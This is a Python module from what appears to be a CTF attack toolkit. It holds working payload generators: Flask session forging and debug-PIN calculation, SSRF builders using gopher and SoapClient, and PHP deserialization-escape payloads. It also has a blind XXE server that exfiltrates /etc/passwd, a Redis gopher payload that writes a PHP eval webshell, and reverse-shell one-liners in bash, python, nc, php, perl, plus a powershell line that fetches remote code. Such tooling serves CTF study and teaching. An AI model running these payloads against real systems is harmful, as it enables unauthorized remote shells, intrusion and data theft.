from ctfbox.utils.utils import md5
import os
import sqlite3
from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum
from functools import partial
from hashlib import md5 as _md5
from hashlib import sha1 as _sha1
from hashlib import sha256 as _sha256
from hashlib import sha512 as _sha512
from http.server import HTTPServer
from itertools import chain
from json import loads
from math import ceil
from os import path
from queue import Queue, Empty
from re import match, sub, IGNORECASE
from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, socket
from tempfile import NamedTemporaryFile
from threading import Lock, Thread
from time import time, sleep
from typing import Dict, List, Tuple, Union, Optional
from urllib.parse import quote, quote_plus, urljoin, urlparse
from zlib import decompress as zlib_decompress

import requests
from ctfbox.exceptions import (DumpError, SvnParseError, DSStoreParseError,
                               FlaskSessionHelperError,
                               GeneratePayloadError, HashAuthArgumentError,
                               HttprawError, ProvideArgumentError, ScanError)
from ctfbox.thirdparty.gin import GitParse
from ctfbox.thirdparty.dsstore import DS_Store
from ctfbox.thirdparty.phpserialize import serialize
from ctfbox.thirdparty.reverse_mtrand import main as reverse_mt_rand_main
from ctfbox.utils import (bin2hex, BlindXXEHandler, Context, ProvideHandler, Threader,
                          random_string)


class HashType(Enum):
    MD5 = 0
    SHA1 = 1
    SHA256 = 2
    SHA512 = 3


CRLF = "\r\n"


filepath = str
content = bytes
routePath = str
contentType = str

HASHTYPE_DICT = {HashType.MD5: _md5, HashType.SHA1: _sha1,
                 HashType.SHA256: _sha256, HashType.SHA512: _sha512}


class SoapClient(object):
    def __init__(self, url, user_agent: str = "", headers: Dict[str, str] = {}, post_data: str = ""):
        self.uri = "hello"
        self.location = url
        self._stream_context = 0
        user_agent = user_agent.strip()
        post_data = post_data.strip()
        new_headers = {}
        if _is_json(post_data):
            new_headers["Content-Type"] = "application/json"
        else:
            new_headers["Content-Type"] = "application/x-www-form-urlencoded"
        new_headers.update(headers)
        new_headers["Content-Length"] = len(post_data)
        headers_string = "\r\n".join(
            f"{k}: {v}" for k, v in new_headers.items())
        self._user_agent = f"""{user_agent}\r\n{headers_string}\r\n\r\n{post_data}"""
        self._soap_version = 1


def _check_flask_import():
    try:
        from flask.sessions import SecureCookieSessionInterface
        return True
    except ImportError:
        return False


def _is_json(data):
    try:
        loads(data)
    except ValueError:
        return False
    return True


def _parse_form_data(body):
    if not body.startswith(b"-"):
        return {}, body
    parse_dict = {"data": {}, "files": {}}
    lines = body.split(b"\n")
    start, end = 0, 0
    while start < len(lines):
        boundary = lines[start]
        if boundary == b"":
            start += 1
            continue
        end = start + lines[start:].index(boundary + b"--")
        file_lines = lines[start:end]
        split_index = file_lines.index(b'')
        file_headers = file_lines[1:split_index]
        file_bodys = file_lines[split_index + 1:end]
        header = file_headers[0]
        content_type = ""

        # ? header
        if not header.lower().startswith(b"content-disposition: "):
            start = end + 1
            continue
        other_headers = header[header.index(b";"):]
        _dict = dict([l.split(b"=")
                      for l in other_headers.strip().split(b";") if b"=" in l])
        _dict = {k.strip(): v.strip(b'"') for k, v in _dict.items()}
        field = _dict.get(b'name', b"")
        filename = _dict.get(b'filename', b"")

        # ? content_type
        if len(file_headers) > 1:
            content_type_header = file_headers[1]
            if content_type_header.lower().startswith(b"content-type:"):
                content_type = content_type_header.split(b":")[1].strip()
            else:
                content_type = "text/plain"

        body_content = b'\n'.join(file_bodys)
        if filename == b"":
            parse_dict["data"][field] = body_content
        else:
            parse_dict["files"][field] = (
                filename.decode(), body_content, content_type.decode())
        start = end + 1
    return parse_dict


def _generateTrashWithValue(diff_len: int, remain: int):
    pure_string_len = 12
    k = ceil((remain + pure_string_len) / diff_len)
    filed_len = k * diff_len - 12 - remain
    if filed_len == 0:
        k += 1
        filed_len = diff_len
    result = '''s:2:"_%s";i:%d;''' % (
        random_string(1), 10 ** (filed_len - 1))
    return k, result


def _generateTrashWithoutValue(diff_len: int, remain: int):
    pure_string_len = 7
    k = ceil((remain + pure_string_len) / diff_len)
    filled_len = k * diff_len - 7 - remain
    if filled_len == 0:
        k += 1
        filled_len = diff_len
    num_len = filled_len
    filled_len -= len(str(num_len))
    result = '''s:%d:"_%s";''' % (num_len, random_string(filled_len))
    return k, result

def _collate_value_for_generate_pin(username: str, absRootPath: str, macAddress: str, machineId: str, modName: str, appName: str):
    return [
        username,
        modName,
        # getattr(app, '__name__', getattr(app.__class__, '__name__'))
        appName,
        # getattr(mod, '__file__', None),
        absRootPath,
    ], [
        # str(uuid.getnode()),  /sys/class/net/ens33/address
        str(int(macAddress.strip().replace(":", ""), 16)),
        machineId,  # get_machine_id(), /etc/machine-id
    ]

def _get_flask_pin(probably_public_bits, private_bits) -> str:
    h = _md5()
    rv, num = None, None

    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(
                num[x:x + group_size].rjust(group_size, '0')
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
    return rv

def _get_flask_200_pin(probably_public_bits, private_bits) -> str:
    h = _sha1()
    rv, num = None, None

    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num
    return rv


def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: str, version: int = 100, modName: str = "flask.app",
                  appName: str = "Flask") -> str:
    """get flask debug pin code.

    Args:
        username (str): username of flask, try get it from /etc/passwd or /proc/self/environ
        absRootPath (str): project abs root path,from getattr(mod, '__file__', None)
        macAddress (str): mac address,from /sys/class/net/<eth0>/address
        machineId (str): machine id,[from /proc/self/cgroup first line with string behind /docker/] or [/etc/machine-id] or [/proc/sys/kernel/random/boot_id]. In version 2.0.0 it became [[/etc/machine-id] or [/proc/sys/kernel/random/boot_id]] splice on [from /proc/self/cgroup first line with string behind /docker/]
        modName (str, optional): mod name.  Defaults to "flask.app".
        appName (str, optional): app name, from getattr(app, '__name__', getattr(app.__class__, '__name__')). Defaults to "Flask".
        version (int): Here you can choose the corresponding generation algorithm according to the version number. Defaults to 100 i.e. `1.0.0` version.

    Returns:
        str: flask debug pin code
    """
    probably_public_bits, private_bits = _collate_value_for_generate_pin(username, absRootPath, macAddress, machineId, modName, appName)

    if (version >= 200):
        return _get_flask_200_pin(probably_public_bits, private_bits)
    else:
        return _get_flask_pin(probably_public_bits, private_bits)
    


class _App:
    def __init__(self, secret_key: str):
        self.secret_key = secret_key


def flask_session_encode(secret_key: str, payload: dict) -> str:
    """encode flask session

    Args:
        secret_key: secret_key
        payload: The data you want to encode

    Returns:
        str: session data

    Example:
        sc = '123'
        pl = {
        'user': 'admin',
        'info': 'test'
        }

        print(flask_session_encode(sc, pl))

        # Output
        eyJpbmZvIjoidGVzdCIsInVzZXIiOiJhZG1pbiJ9.YA2XHw.PSPjYFyj3hxsTNx-d2vjncAMJW4
    """
    if not _check_flask_import():
        raise ImportError(
            "Please install moudle flask. e.g. python3 -m pip install flask")
    from flask.sessions import SecureCookieSessionInterface
    try:
        app = _App(secret_key)
        scsi = SecureCookieSessionInterface()
        s = scsi.get_signing_serializer(app)
        return s.dumps(payload)
    except Exception as e:
        raise FlaskSessionHelperError("Encode error") from e


def flask_session_decode(session_data: str, secret_key: str) -> dict:
    """decode flask session

    Args:
        session_data: The session you want to decode
        secret_key: secret_key

    Returns:
        dict: session data information

    Example:
        ss = 'eyJpbmZvIjoidGVzdCIsInVzZXIiOiJhZG1pbiJ9.YA2WEA.phDDlkaEQOaXthwvpENxAeiHfiE'
        print(flask_session_decode(ss, '123'))
        print(flask_session_decode(ss, '12345'))

        # Output
        {'info': 'test', 'user': 'admin'}
        # raise a FlaskSessionHelperError
    """
    if not _check_flask_import():
        raise ImportError(
            "Please install moudle flask. e.g. python3 -m pip install flask")
    from flask.sessions import SecureCookieSessionInterface
    try:
        app = _App(secret_key)
        scsi = SecureCookieSessionInterface()
        s = scsi.get_signing_serializer(app)
        return s.loads(session_data)
    except Exception as e:
        raise FlaskSessionHelperError("Deocde error") from e


def provide(host: str = "0.0.0.0", port: int = 2005, isasync: bool = False,
            files: List[Tuple[Union[filepath, content], routePath, contentType]] = {}):
    """A simple and customizable http server.

    Args:
        host (str, optional): listen host. Defaults to "0.0.0.0".
        port (int, optional): listen port Defaults to 2005.
        isasync (bool, optional): Whether is async. Defaults to False.
        files (List[Tuple[Union[filepath, content], routePath, contentType]], optional): provide files. Defaults to {}.

    Raises:
        ProvideArgumentError

    Example:
        # provide a exist file named index.html
        provide(files=[('index.html',)])
        # Here is a trick if you provide only one file
        provide(files=['index.html'])
        # route /index.html provide content Hello world\n
        provide(files=[(b"Hello world\\n", "/index.html")])
        # provide some files
        provide(files=[("test.txt", ), ("index.html", )])
    """

    if isinstance(files, list):
        if not isinstance(files[0], (list, tuple)):
            files = [files]
    else:
        raise ProvideArgumentError("files type must be list")
    handler = partial(ProvideHandler, files)
    server = HTTPServer((host, port), handler)
    print(f"Listen on {host}:{port} ...")
    if isasync:
        t = Thread(target=server.serve_forever)
        t.start()
    else:
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print('[#] KeyboardInterrupt')
            server.shutdown()


def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", prefix: str = "", suffix: str = "", maxRange: int = 1000000, threadNum: int = 25,
             hashType: HashType = HashType.MD5) -> str:
    """A function used to blast the first few bits of the hash, often used to crack the ctf verification code.

    Args:
        startIndex (int, optional): argument answer start index. Defaults to 0.
        endIndex (int, optional): argument answer end index. Defaults to 5.
        answer (str, optional): Part of the result hash. Defaults to "".
        prefix (str, optional): Set the prefix of the original value. Defaults to "".
        suffix (str, optional): Set the suffix of the original value. Defaults to "".
        maxRange (int, optional): burte force number max range. Defaults to 1000000.
        threadNum (int, optional): thread number. Defaults to 25.
        hashType (HashType, optional): burte force hash type. Defaults to HashType.MD5.

    Raises:
        HashAuthArgumentError

    Returns:
        str: the original value that its hash satisfies the answer

    Example:
        ### HashType optional value: HashType.MD5, HashType.SHA1, HashType.SHA256, HashType.SHA512
        ### Crack the first five number MD5 type ctf verification codes
        print(hashAuth(answer="02fcf"))
        ### Crack the first five number SHA1 type ctf verification codes
        print(hashAuth(answer="d13ce", hashType=HashType.SHA1))
        #### Crack more quickly!!
        print(hashAuth(answer="c907773", endIndex=7, threadNum=50))
        ### Make the range bigger!!
        print(hashAuth(answer="59e711d", endIndex=7, maxRange=2000000))
        ### If the challenge requires the calculation of `md5("WTF" + ??) = "ba25a77"`
        print(hashAuth(answer="ba25a77", prefix="WTF"))
    """
    if hashType not in HASHTYPE_DICT:
        raise HashAuthArgumentError("HashType type error")

    hash_len = endIndex - startIndex
    if hash_len <= 0:
        raise HashAuthArgumentError("startIndex/endIndex error")

    if hash_len != len(answer):
        if startIndex == 0:
            endIndex = len(answer)
        else:
            raise HashAuthArgumentError("Hash length error")
    i = iter(range(maxRange))
    context = Context()
    hashfunc = HASHTYPE_DICT[hashType]

    @Threader(threadNum)
    def run(context):
        while context.value is None:
            try:
                guess = next(i)
            except StopIteration:
                break
            if hashfunc((prefix + str(guess) + suffix).encode()).hexdigest()[startIndex:endIndex] == answer:
                context.value = True
                return guess
        return -1

    tasks = [run(context) for _ in range(threadNum)]

    for task in tasks:
        if task.result == -1 or not task.result:
            continue
        return str(task.result)


def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, requests.Request]:
    """Send raw request by python-requests

    Origin:
        https://github.com/boy-hack/hack-requests

    Args:
        raw(bytes/str): raw http request
    kwargs:
        proxies(dict) : requests proxies. Defaults to None.
        timeout(float): requests timeout. Defaults to 60.
        verify(bool)  : requests verify. Defaults to True.
        real_host(str): use real host instead of Host if set.
        ssl(bool)     : whether https. Defaults to False.
        session(bool) : use this session instead of new session.
        send(bool)    : whether to send the request. Defaults to True.

    Raises:
        HttprawError

    Returns:
        requests.Response: the requests response
    """
    if isinstance(raw, str):
        raw = raw.encode()
    raw = raw.strip()
    send = kwargs.get("send", True)
    session = kwargs.get("session", None)
    proxies = kwargs.get("proxy", None)
    timeout = kwargs.get("timeout", 60.0)
    verify = kwargs.get("verify", True)
    real_host = kwargs.get("real_host", None)
    ssl = kwargs.get("ssl", False)

    if real_host:
        real_host = real_host.encode()
    # ? Judgment scheme
    scheme = 'http'
    port = b"80"
    if ssl:
        scheme = 'https'
        port = b"443"

    try:
        index = raw.index(b'\n')
    except ValueError:
        raise Exception("ValueError")
    # ? get method, path and protocol
    try:
        method, path, protocol = raw[:index].split(b" ")
    except Exception:
        raise Exception("Protocol format error")
    raw = raw[index + 1:]

    # ? get host
    try:
        host_start = raw.index(b"Host: ")
        host_end = raw.index(b'\n', host_start)

    except ValueError:
        raise ValueError("Host headers not found")

    if real_host:
        host = real_host
        if b":" in real_host:
            host, port = real_host.split(b":")
    else:
        host = raw[host_start + len("Host: "):host_end]
        if b":" in host:
            host, port = host.split(b":")
    raws = raw.splitlines()
    headers = {}
    index = 0
    # ? get headers
    for r in raws:
        if r == b"":
            break
        try:
            k, v = r.split(b": ")
        except Exception:
            k = r
            v = ""
        headers[k.decode()] = v.decode()
        index += 1
    # ? get body
    if len(raws) < index + 1:
        body = b''
    else:
        body = b'\n'.join(raws[index + 1:]).lstrip()

    # ? get url
    port = port.decode()
    if (port == "80" and scheme == "http") or (port == "443" and scheme == "https"):
        url = f"{scheme}://{host.decode()}{path.decode()}"
    else:
        url = f"{scheme}://{host.decode()}:{port}{path.decode()}"
    # ? get content-length
    # ? let requests to count it
    # ? deal with chunked
    if body and headers.get("Transfer-Encoding", '').lower() == "chunked":
        body = body.replace('\r\n', '\n')
        body = body.replace('\n', '\r\n')
        body = body + "\r\n" * 2

    # ? deal with Content-Type and body
    parse_dict = {"files": {}, "data": {}}
    if method.upper() == b"POST":
        if "Content-Type" not in headers:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if _is_json(body) and headers["Content-Type"] not in ["application/json", "multipart/form-data"]:
            headers["Content-Type"] = "application/json"
        if headers["Content-Type"] == "application/x-www-form-urlencoded":
            body = dict([l.split(b"=")
                         for l in body.strip().split(b"&") if b"=" in l])
            body = {k.strip().decode(): v.strip().decode()
                    for k, v in body.items()}
        elif "multipart/form-data" in headers["Content-Type"]:
            parse_dict = _parse_form_data(body)
            body = parse_dict["data"]
            del headers["Content-Type"]  # ? let requests to set Content-Type

    # ? prepare request
    if session:
        if not isinstance(session, requests.Session):
            raise HttprawError("Session invalid")
    else:
        session = requests.Session()
    req = requests.Request(method, url, data=body,
                           headers=headers, files=parse_dict["files"])
    prepped = req.prepare()
    if send:
        return session.send(prepped,
                            proxies=proxies,
                            timeout=timeout,
                            verify=verify,
                            )
    else:
        return req


def gopherraw(raw: str, host: str = "", ssrfFlag: bool = True) -> str:
    """Generate gopher requests URL form a raw http request

    Args:
        raw (str): raw http request
        host (str, optional): use this as the real host if this value is set. Defaults to "".
        ssrfFlag (bool, optional): The entire URL will be encoded again if this value is set True. Defaults to True.

    Returns:
        str: gopher requests URL

    Examples:
        raw = '''POST /admin HTTP/1.1
        Host: 127.0.0.1:5000
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Cookie: isAdmin=1
        Upgrade-Insecure-Requests: 1
        Content-Length: 3

        a=b'''

        print(gopherraw(raw, ssrfFlag=False))
        # output is gopher://127.0.0.1:5000/_%0D%0APOST%20/admin%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A5000%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A84.0%29%20Gecko/20100101%20Firefox/84.0%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/webp%2C%2A/%2A%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AConnection%3A%20close%0D%0ACookie%3A%20isAdmin%3D1%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AContent-Length%3A%203%0D%0A%0D%0Aa%3Db
        # curl this url directly
    """
    data = ""
    for row in raw.split("\n"):
        if len(row) > 0 and row[-1] == "\r":
            data += quote(row + "\n")
        else:
            data += quote(row + "\r\n")

        header = row.lower().strip()
        if header.startswith("host:"):
            if host == "":
                host = header[5:].strip()
                if ":" not in host:
                    host += ":80"

    header = "gopher://" + host + "/_"

    if ssrfFlag:
        return quote(header + data)
    return header + data


def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
    """Use for generate php unserialize escape attack payload, will decide to call l2s or s2l according to the length of src and dst

    Args:
        src (str): search string
        dst (str): replace string, this length cannot be the same as src
        payload (str):  the php serialize data you want to insert
        paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
        newObject (bool, optional): set to true when you want to insert a new object. Only work for short to long mode. Defaults to False.

    Returns:
        s2l:
            dict:
                insert_data: The payload that caused the data modification
        l2s:
            dict:
                populoate_data: Data used to fill, causing characters to escape
                trash_data: To fix the length error
                insert_data: The payload that caused the data modification

    Example:
        php_serialize_escape("x", "yy", '''s:8:"password";s:6:"123456"''')
        php_serialize_escape("yy", "x", '''s:8:"password";s:4:"test";s:4:"sign";s:6:"hacker"''')

    Note:
        s2l if length of src shorter than length of dst
        s2l if length of src greater than length of dst
    """
    diff_len = len(dst) - len(src)
    if diff_len > 0:
        return php_serialize_escape_s2l(src, dst, payload, paddingTrush, newObject)
    elif diff_len < 0:
        return php_serialize_escape_l2s(src, dst, payload, paddingTrush, newObject)
    else:
        raise GeneratePayloadError(
            "The length of dst cannot be the same as src")


def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
    """
    Use for generate short to long php unserialize escape attack payload
    Tips:
        - only for php class unserialize

    Args:
        src (str): search string
        dst (str): replace string, this length must be greater than src
        payload (str): the php serialize data you want to insert
        paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
        newObject (bool, optional): set to true when you want to insert a new object. Defaults to False.


    Returns:
        dict:
            insert_data: The payload that caused the data modification

    Example:
        php_serialize_escape_s2l("x", "yy", '''s:8:"password";s:6:"123456"''')
    """
    diff_len = len(dst) - len(src)
    if diff_len <= 0:
        raise GeneratePayloadError("dst length must be greater than src")

    is_object = payload.startswith("O")
    if is_object:
        padding_len, remain = divmod(len(payload) + 3, diff_len)
    else:
        padding_len, remain = divmod(len(payload) + 4, diff_len)

    if remain != 0:
        if not paddingTrush:
            raise GeneratePayloadError(
                "payload length error, try modify it, maybe you can put {paddingTrush=True} into the function")
        print(newObject)
        if newObject:
            k, trush = _generateTrashWithoutValue(diff_len, remain)
        else:
            k, trush = _generateTrashWithValue(diff_len, remain)
        padding_len += k
        payload = trush + payload

    if is_object:
        payload = '";' + payload + "}"
    else:
        payload = '";' + payload + ";}"

    result = src * padding_len + payload
    result_dict = {
        'insert_data': result
    }
    return result_dict


def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
    """
    Use for generate long to short php unserialize escape attack payload

    Tips:
        - only for php class unserialize

    Args:
        src(str): search string
        dst(str): replace string, this length must be shorter than search
        payload(str): the php serialize data you want to insert
        paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
        newObject (bool, optional): useless.

    Returns:
        dict:
            populoate_data: Data used to fill, causing characters to escape
            trash_data: To fix the length error
            insert_data: The payload that caused the data modification

    Example:
        php_serialize_escape_l2s("yy", "x", '''s:8:"password";s:4:"test";s:4:"sign";s:6:"hacker"''')
    """
    eatString = "\";" + payload.split(';')[0] + f';s:{len(payload) + 4}:"'
    # ": + payload + ;} --> len(payload) + 4
    diff_len = len(src) - len(dst)
    if diff_len <= 0:
        raise GeneratePayloadError("src length must be greater than dst")

    padding_len, remain = divmod(len(eatString), diff_len)

    # There is no remainder
    if remain == 0:
        populate_data = padding_len * src
        insert_data = "\";" + payload + ";}"

        result = {
            'populoate_data': populate_data,
            'insert_data': insert_data,
            'trash_data': None
        }

        return result

    # If there is a remainder, then pad trash data into the payload
    if not paddingTrush:
        raise GeneratePayloadError(
            "payload length error, try modify it, maybe you can put {paddingTrush=True} into the function")

    print('There is a remainder, the function will pad trash data into the payload to fix the length error')

    for i in range(100):
        padding_len, remain = divmod(len(eatString + (i * '@')), diff_len)
        if remain == 0:
            populate_data = padding_len * src
            insert_data_with_trash = (i * '@') + "\";" + payload + ";}"

            result = {
                'populate_data': populate_data,
                'insert_data': insert_data_with_trash,
                'trash_data': (i * '@')
            }
            return result


def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, str] = {}, post_data: str = "", encode: bool = True) -> Union[str, bytes]:
    """Generate php soapClient class payload for ssrf

    Args:
        url (str): target url
        user_agent (str, optional): the user agent. Defaults to "Syclover".
        headers (Dict[str, str], optional): ohter headers. Defaults to {}.
        post_data (str, optional): the data you want to post. Defaults to "".
        encode (bool, optional): whether to encode payload. Defaults to True.

    Returns:
        Union[str, bytes]: generated payload
    """
    if not user_agent:
        user_agent = "Syclover"
    soap = SoapClient(url, user_agent, headers, post_data)
    s = serialize(soap)
    try:
        s = s.decode()
    except UnicodeDecodeError:
        pass
    if encode:
        return quote_plus(s)
    else:
        return s


def scan(url: str, scanList: list = [], filepath: str = "", show: bool = True, timeout: int = 60, threadNum: int = 10) -> list:
    """Scan for find existing network path

    Args:
        url (str): the host you want to scan
        scanList (list, optional): the path list to scan. Defaults to [].
        filepath (str, optional): the dictionary file path, it will be preferred. Defaults to "".
        show (bool, optional): whether print result. Defaults to True.
        timeout (int, optional): request timeout. Defaults to 60.
        threadNum (int, optional): thread number. Defaults to 10.

    Raises:
        ScanError

    Returns:
        list: existing network path
    """
    url = url.strip()
    it = None

    if not match(r"^https?:/{2}\w.+$", url):
        raise ScanError("Url invalid")

    if filepath:
        if path.exists(filepath):
            it = open(filepath, 'r')
        else:
            raise ScanError("File path invalid")
    else:
        it = iter(scanList)
    result = []

    @Threader(threadNum)
    def run(host):
        while 1:
            try:
                url = urljoin(host, next(it).strip())
            except StopIteration:
                break
            res = requests.head(url, timeout=timeout)
            if 200 <= res.status_code < 400:
                result.append((res.status_code, url))
                if show:
                    print(url)

    tasks = [run(url) for _ in range(threadNum)]

    for task in tasks:
        _ = task.result

    return result


def bak_scan(url: str):
    """A partial function of scan for backup file scanning


    Args:
        url (str): the host you want to scan

    Returns:
        list: existing network path

    Note:
        dictionary origin: https://github.com/kingkaki/ctf-wscan/blob/master/dict/default.txt
    """
    dict_path = path.join(path.split(path.realpath(__file__))[
                          0], "../", "thirdparty", "dict", "bak.txt")

    return scan(url, filepath=dict_path)


def reshell(ip: str, port: Union[str, int], tp: str = "bash") -> str:
    """Generate reverse shell command

    Args:
        ip (str): reverse host
        port (Union[str, int]): reverse port
        tp (str, optional): reverse type. Defaults to "bash".

    AllowTypes:
        bash
        python/py
        nc
        php
        perl
        powershell/ps

    Returns:
        str: generated command
    """

    command = ""
    if (tp == "bash"):
        command = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    elif (tp == "py" or tp == "python"):
        command = f"""python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
    elif (tp == "nc"):
        command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    elif (tp == "php"):
        command = f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    elif (tp == "perl"):
        command = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'""" % (
            ip, port)
    elif (tp == "ps" or tp == "powershell"):
        command = """powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd'""" % (ip, port)
    return command


class OOB():
    """An auxiliary class for oob, You can iterate it directly to get the data.

    Args:
        showDomain(bool, optional): whether to show domain. Defaults to True.
        debug (bool, optional): whether debug mode is enabled. Default to False.

    Returns:
        iterable: An iterator that can be used to get data

    Methods:
        prepare(self, data) -> str  # prepare url which you can send with data

    Note:
        power by dnslog.cn

    Example:
        with OOB() as oob:
            domain = oob.domain  # get domain
            requests.get(oob.prepare("test"))  # send "test" and you will receive it
            print(oob.get_one())
    """

    def __init__(self, showDomain: bool = True, debug: bool = False):
        self._queue = Queue(-1)
        self._hashlist = []
        self._cookies = {"PHPSESSID": str(uuid4())}
        self.domain = self._get_domain()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, trace):
        del self._queue

    def _get_domain(self):
        res = requests.get("http://dnslog.cn/getdomain.php",
                           cookies=self._cookies)
        return res.text.strip()

    def get_one(self, no_wait=True, interval=0.5, timeout=5) -> Optional[str]:
        """Get the latest one record.

        Args:
            no_wait (bool, optional): whether unblocking. Defaults to True.
            interval (float, optional): interval seconds. Defaults to 0.5.
            timeout (int, optional): timeout seconds. Defaults to 5.

        Returns:
            Optional[str]: record data
        """
        past_time = 0
        while True:
            self._get()
            try:
                return self._queue.get_nowait()
            except Empty:
                if no_wait:
                    return None
                else:
                    sleep(interval)
                    past_time += interval
                    if past_time >= timeout:
                        return None

    def _get(self):
        res = requests.get("http://dnslog.cn/getrecords.php",
                           cookies=self._cookies)
        records = '{"records":' + res.text.strip() + "}"
        records = loads(records)["records"]

        for record in records:
            if len(record) != 3:
                continue
            record_hash = md5(str(record))
            if record_hash in self._hashlist:
                continue

            self._hashlist.append(record_hash)
            data = record[0].split(".", 1)[0]

            self._queue.put(data)


    def prepare(self, data) -> str:
        """prepare url which you can send with data

        Args:
            data (str): the data to send

        Returns:
            str: prepared url
        """
        return f"http://{data}.{self.domain}"


def blindXXE(host: str = "0.0.0.0", port: int = 2021, isasync: bool = False):
    """Build a server for blind xxe.
    It will generate payload and wait for receive file contents.

    Note:
        read file payload like http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2]:
            argument file(optional): the path of the file you want to read. Defaults to "/etc/passwd".
            argument bz2(optional): whether to use bz2 compress.
        custom payload like http://{host}:{port}/custom.dtd?link=[any custom link]
            arugment link: The link protocol can be any protocol supported by the victim server, this server will try to decode the received content with bz2 and base64

    Args:
        host (str, optional): host that the victim can access. Defaults to "0.0.0.0".
        port (int, optional): listening port. Defaults to 2021.
        isasync (bool, optional): Whether is async. Defaults to False.
    """
    content = f"""<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=!readFile!">
<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
%hack;""".encode()
    bz2content = f"""<!ENTITY % payload SYSTEM "php://filter/bzip2.compress/convert.base64-encode/resource=!readFile!">
<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
%hack;""".encode()
    customcontent = f"""<!ENTITY % payload SYSTEM "!link!">
<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
%hack;""".encode()

    handler = partial(BlindXXEHandler, content, bz2content, customcontent)
    server = HTTPServer(("0.0.0.0", port), handler)
    print(f"Listen on 0.0.0.0:{port} ...\n")
    print(f"""Read file payload:<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2]">
%remote;
%go;
]>

<root></root>

Custom payload:
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://{host}:{port}/custom.dtd?link=[any custom link]">
%remote;
%go;
]>

<root></root>
""")
    if isasync:
        t = Thread(target=server.serve_forever)
        t.start()
    else:
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print('[#] KeyboardInterrupt')
            server.shutdown()


def _redis_format(*redis_cmd):
    if len(redis_cmd) == 0:
        return ""

    cmd = f"*{len(redis_cmd)}"
    for line in redis_cmd:
        cmd += f"{CRLF}${len(line)}{CRLF}{line}"
    cmd += CRLF
    return cmd


def gopherredis_webshell(host: str, authPass: str = "", webFile: str = "/var/www/html/syc.php", content: str = "<?php eval($_REQUEST['syc']); ?>", urlEncoding: bool = False) -> str:
    """generate gopher payload for attack redis to write webshell.

    Args:
        host (str): target redis host.
        authPass (str, optional): redis auth pass. Defaults to "".
